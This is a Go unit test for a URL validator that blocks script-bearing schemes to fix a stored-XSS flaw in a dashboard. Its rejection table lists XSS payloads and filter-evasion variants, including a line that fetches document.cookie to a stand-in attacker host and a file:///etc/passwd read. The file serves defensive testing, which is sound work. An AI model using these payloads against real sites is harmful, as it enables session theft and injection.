package server

import (
	"strings"
	"testing"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// TestValidateURLField_RejectsScriptBearingSchemes is the core pin for the
// stored-XSS finding: a caller with task:write must not be able to persist a
// URL whose scheme can execute script when the dashboard renders it into an
// href.
func TestValidateURLField_RejectsScriptBearingSchemes(t *testing.T) {
	// Each of these is a well-formed URI under RFC 3986, which is why the
	// proto's `string.uri = true` constraint would not have caught any of them
	// even if protovalidate had been invoked.
	rejected := []struct {
		name string
		url  string
	}{
		{"javascript", "javascript:alert(1)"},
		{"javascript exfiltration", "javascript:fetch('//attacker/'+document.cookie)"},
		{"javascript mixed case", "JaVaScRiPt:alert(1)"},
		{"javascript upper case", "JAVASCRIPT:alert(1)"},
		{"data html", "data:text/html,<script>alert(1)</script>"},
		{"data base64", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
		{"vbscript", "vbscript:msgbox(1)"},
		{"blob", "blob:https://example.com/uuid"},
		{"file", "file:///etc/passwd"},
		{"leading tab", "\tjavascript:alert(1)"},
		{"leading newline", "\njavascript:alert(1)"},
		{"leading space", " javascript:alert(1)"},
		{"embedded tab", "java\tscript:alert(1)"},
		{"embedded newline", "java\nscript:alert(1)"},
		{"embedded carriage return", "java\rscript:alert(1)"},
		{"leading NUL", "\x00javascript:alert(1)"},
		{"trailing whitespace", "javascript:alert(1) "},
		{"scheme relative", "//evil.com/x"},
		{"relative path", "/relative/path"},
		{"bare word", "not-a-url"},
		{"http without host", "http://"},
		{"backslash host confusion", "http:/\\/\\evil.com"},
	}

	for _, tc := range rejected {
		t.Run(tc.name, func(t *testing.T) {
			err := validateURLField("test_field", tc.url)
			if err == nil {
				t.Fatalf("validateURLField(%q) = nil, want rejection", tc.url)
			}
			st, ok := status.FromError(err)
			if !ok {
				t.Fatalf("error is not a gRPC status: %v", err)
			}
			if st.Code() != codes.InvalidArgument {
				t.Errorf("code = %v, want InvalidArgument", st.Code())
			}
			if !strings.Contains(st.Message(), "test_field") {
				t.Errorf("message %q does not name the field", st.Message())
			}
		})
	}
}

func TestValidateURLField_AcceptsHTTPAndHTTPS(t *testing.T) {
	accepted := []struct {
		name string
		url  string
	}{
		{"https", "https://github.com/o/r/pull/1"},
		{"http", "http://example.com/x"},
		{"https mixed case scheme", "HtTpS://example.com"},
		{"http upper case scheme", "HTTP://example.com"},
		{"port", "https://example.com:8443/x"},
		{"query and fragment", "https://example.com/x?a=1&b=2#frag"},
		{"credentials", "https://user:pass@example.com/x"},
		{"encoded space", "https://example.com/a%20b"},
		// Empty means "unset" and lets callers clear the field. An empty href
		// cannot execute script.
		{"empty", ""},
	}

	for _, tc := range accepted {
		t.Run(tc.name, func(t *testing.T) {
			if err := validateURLField("test_field", tc.url); err != nil {
				t.Fatalf("validateURLField(%q) = %v, want nil", tc.url, err)
			}
		})
	}
}
